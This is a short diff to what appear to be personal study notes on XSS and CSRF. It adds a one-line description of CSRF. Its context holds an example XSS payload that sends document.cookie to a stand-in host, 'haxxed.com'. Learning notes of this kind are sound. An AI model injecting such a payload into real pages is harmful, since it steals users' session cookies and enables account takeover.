@@ -880,3 +880,5 @@ hyosung11@HyoSungs-iMac projects %`
 ### XSS (Cross-site Scripting) & CSRF (Cross-site Request Forgery)
 - XSS running code across sites to different sites from my browser (as a bad actor)
 - e.g., `window.location = 'haxxed.com?cookie=' + document.cookie`
+
+- CSRF: link to malicious URL 
